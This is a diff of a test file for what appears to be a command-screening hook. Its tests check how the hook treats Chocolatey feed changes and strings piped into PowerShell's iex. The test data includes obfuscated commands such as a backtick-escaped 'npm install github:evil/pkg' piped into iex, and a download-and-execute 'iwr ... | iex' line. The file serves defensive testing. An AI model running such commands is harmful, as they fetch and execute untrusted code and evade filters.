@@ -78,7 +78,6 @@ const SOURCE_CHANGES: Case[] = [
   ['Bash', 'sudo choco source remove -n=x'],
   ['Bash', 'echo hi; choco source disable -n=x'],
   ['Bash', 'cmd /c choco source add -n=x -s=https://feed.example/'],
-  ['Bash', 'chocolatey source add -n=x -s=https://feed.example/'],
   ['Bash', 'choco -y source remove -n=x'],
   ['Bash', 'choco source $VERB -n=x'],
   ['PowerShell', `choco source add -n=x -s=${URL_X}`],
@@ -296,6 +295,19 @@ describe('rule 4: a string piped into iex gets the verdict of the bare iex comma
     ['PowerShell', '(iwr https://example.com/install.ps1) | iex'],
   ])('[%s] %s is unchanged', (tool, command) => {
     expect(runHook(command, tool).decision).toBeUndefined();
+  });
+
+  // The string is PowerShell text whatever the outer tool is: a backtick before a letter is an escape (inst`all runs install).
+  // Single quotes keep the backtick in the outer Bash text. Both reads are used, so the result is never looser than either.
+  it.each<Case>([
+    ['Bash', "echo 'npm inst`all github:evil/pkg' | iex"],
+    ['Bash', "'npm inst`all github:evil/pkg' | Invoke-Expression"],
+    ['Bash', "iex 'npm inst`all github:evil/pkg'"],
+    ['PowerShell', "echo 'npm inst`all github:evil/pkg' | iex"],
+  ])('[%s] %s is read as PowerShell and asks', (tool, command) => {
+    const r = runHook(command, tool);
+    expect(r.decision).toBe('ask');
+    expect(r.reason.match(/Non-registry source/g)?.length).toBe(1);
   });
 
   // A parser error (a heredoc delimiter too long for its RegExp) leaves the command unread: a piped iex must fail closed.
